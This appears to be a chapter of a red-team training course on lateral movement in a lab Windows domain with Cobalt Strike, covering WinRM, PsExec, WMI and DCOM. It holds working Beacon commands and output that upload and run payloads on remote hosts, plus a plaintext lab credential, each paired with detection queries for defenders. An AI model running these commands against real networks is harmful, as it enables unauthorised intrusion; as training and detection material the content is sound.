Moving laterally between computers in a domain is important for accessing sensitive information/materials, and obtaining new credentials.  Cobalt Strike provides three strategies for executing Beacons/code/commands on remote targets.

The first and most convenient is to use the built-in jump command - the syntax is jump [method] [target] [listener].  Type jump to see a list of methods.  This will spawn a Beacon payload on the remote target, and if using a P2P listener, will connect to it automatically.

    Beacon Remote Exploits
    ======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM

Each method has it's own set of OPSEC concerns - we'll review some of the main indicators of each technique as we go through them.

The second strategy is to use the built-in remote-exec command - the syntax is remote-exec [method] [target] [command].  Type remote-exec to see a list of methods.

    Beacon Remote Execute Methods
    =============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI


The remote-exec commands simply provide a means of executing commands on a remote target.  They are therefore not exclusive to lateral movement, but they can be used as such.  They require more manual work to manage the payload, but do offer a wider degree of control over what gets executed on the target.  You also need to connect to P2P Beacons manually using connect or link.

The third is to use Cobalt Strike's other primitives (powershell, execute-assembly, etc) to implement something entirely custom.  This requires the most amount of effort but also offers you the greatest degree of control.  Custom methods can be integrated into the jump and remote-exec commands using Aggressor.

Each of these strategies are compatible with the various techniques described in the User Impersonation chapter.  For example, you can use pth to impersonate a user and then jump to move laterally.

Some of Seatbelt's commands can also be run remotely, which can be useful enumerating its configurations and  defences before jumping to it.

    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
    
    Hostname                      :  web
    Domain Name                   :  dev.cyberbotic.io
    ProductName                   :  Windows Server 2022 Datacenter
    EditionID                     :  ServerDatacenter
    ReleaseId                     :  2009
    Build                         :  20348
    BuildBranch                   :  fe_release
    CurrentMajorVersionNumber     :  10
    CurrentVersion                :  6.3
    Architecture                  :  AMD6


Most lateral movement techniques leverage legitimate Windows management functionality, as this type of traffic and activity is not unusual to see on a network.

# Windows Remote Management 

The winrm and winrm64 methods can be used for 32 and 64-bit targets as appropriate.

The SMB Beacon is an excellent choice when moving laterally, because the SMB protocol is used extensively in a Windows environment, so this traffic blends in very well.

    beacon> jump winrm64 web.dev.cyberbotic.io smb
    [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web.dev.cyberbotic.io via WinRM
    [+] host called home, sent: 225172 bytes
    [+] established link to child beacon: 10.10.122.30

WinRM will return a high integrity Beacon running as the user with which you're interacting with the remote machine as.

This new Beacon will be running inside wsmprovhost.exe, which is the "Host process for WinRM plug-ins".  This is used whenever WinRM is used, legitimate or otherwise.  You can search for process start events, but this will produce a lot of false positives if WinRM is being used legitimately by system administrators.

    event.category: process and event.type: start and process.name: wsmprovhost.exe

The most likely means of identifying this lateral movement is by searching PowerShell script block logs for known payload artefacts.

    event.category: process and powershell.file.script_block_text: "$var_runme.Invoke([IntPtr]::Zero)"

# PSExec 

The psexec / psexec64 commands work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary.  Beacons executed this way run as SYSTEM.

    beacon> jump psexec64 web.dev.cyberbotic.io smb
    [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web via Service Control Manager (\\web\ADMIN$\768870c.exe)
    
    Started service 768870c on web.dev.cyberbotic.io
    [+] established link to child beacon: 10.10.122.30

A reliable way of searching for PsExec is by looking for 4697 service created events.  These are often quite rare, unless a service comes with a software installation or something similar.  Cobalt Strike generates a random 7-character alphanumeric string which it uses for both the service name and binary filename.  When setting the binPath for the service, it uses a UNC path to the ADMIN$ share.

    event.code: 4697 and winlog.event_data.ServiceFileName: \\\\*\\ADMIN$\\*.exe


psexec_psh doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).  The pattern it uses by default is %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ....

    beacon> jump psexec_psh web smb
    [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web via Service Control Manager (PSH)
    
    Started service bd119dd on web
    [+] established link to child beacon: 10.10.122.30

# Windows Management Instrumentation (WMI)

As you may have noticed, WMI is not part of the jump command but it is part of remote-exec. The remote-exec method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

As you may have noticed, WMI is not part of the jump command but it is part of remote-exec. The remote-exec method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

You can upload a file to a remote machine by cd'ing to the desired UNC path and then use the upload command.

    beacon> cd \\web.dev.cyberbotic.io\ADMIN$
    beacon> upload C:\Payloads\smb_x64.exe
    beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
    Started process 3280 on web.dev.cyberbotic.io

The process is now running on WEB so now we need to connect to it.

    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
    [+] established link to child beacon: 10.10.122.30

As with WinRM, the process will be running in an elevated context of the calling user.

When a binary is executed via WMI in this way, it will be a child of WmiPrvSE.exe.  We can therefore look for process create events where WmiPrvSE is the parent.

    event.category: process and event.type: start and process.parent.name: WmiPrvSE.exe

# The Curious Case of CoInitializeSecurity

Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process.  The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.

An example of that can look like the following:

    beacon> make_token DEV\jking Qwerty123
    [+] Impersonated DEV\bfarmer
    
    beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
    CoInitializeSecurity already called. Thread token (if there is one) may not get used
    [-] Could not connect to web.dev.cyberbotic.io: 5

We know jking is a local admin on WEB but because CoInitializeSecurity has already been called (probably in the context of bfarmer), WMI fails with access denied.  As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.

    beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"
    [*] Host                           : web.dev.cyberbotic.io
    [*] Command                        : C:\Windows\smb_x64.exe
    [*] Creation of process returned   : 0
    [*] Process ID                     : 3436

# DCOM 

Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so we must use an external tool such as Invoke-DCOM.  We'll see in a later module how this can be integrated into the jump command.

    beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
    beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
    Completed

    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
    [+] established link to child beacon: 10.10.122.30

DCOM is more complicated to detect, since each "Method" works in a different way. In the particular case of MMC20.Application, the spawned process will be a child of mmc.exe.

    event.category: process and event.type : start and process.parent.name: mmc.exe

Processes started via DCOM may also be observed where the parent is svchost.exe with command line arguments of -k DcomLaunch.
